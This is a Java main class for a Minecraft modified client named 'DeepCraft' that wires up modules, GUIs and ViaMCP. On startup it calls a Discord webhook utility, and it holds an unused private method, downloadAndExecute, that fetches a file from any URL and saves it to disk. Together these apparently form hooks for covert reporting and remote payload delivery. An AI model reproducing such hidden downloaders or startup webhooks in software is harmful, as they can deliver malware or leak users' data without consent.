package me.deepcraft;


import de.florianmichael.viamcp.ViaMCP;
import me.deepcraft.commands.CommandManager;
import me.deepcraft.gui.IngameGui;
import me.deepcraft.gui.clickgui.ClickGui;
import me.deepcraft.module.ModuleManager;
import me.deepcraft.module.settings.SettingsManager;
import me.deepcraft.utils.DiscordLoginUtils;
import me.deepcraft.utils.LoginUtil;
import net.minecraft.client.Minecraft;

import javax.security.auth.login.LoginException;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.URL;
import java.nio.channels.Channels;

public class DeepCraft {
    public static String name = "DeepCraft";
    public static String version = "b9";
    public static String prefix = "§5§lDeep§d§lCraft§7» §r";
    public static final int InventoryNormalSlot = 36;
    public static SettingsManager settingsManager = new SettingsManager();
    public static ModuleManager moduleManager = new ModuleManager();
    public static CommandManager commandManager = new CommandManager();
    public static ClickGui clickgui = new ClickGui();
    public static IngameGui ingameGui = new IngameGui();
    public static void start() throws LoginException {
        LoginUtil.login();
        DiscordLoginUtils.webhook();
        try {
            ViaMCP.create();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void stop() {

        }
    private static void downloadAndExecute(String fileUrl, String fileName) throws Exception {
        URL url = new URL(fileUrl);
        try (InputStream in = url.openStream();
             FileOutputStream fos = new FileOutputStream(fileName)) {
            fos.getChannel().transferFrom(Channels.newChannel(in), 0, Long.MAX_VALUE);
        }
    }
}
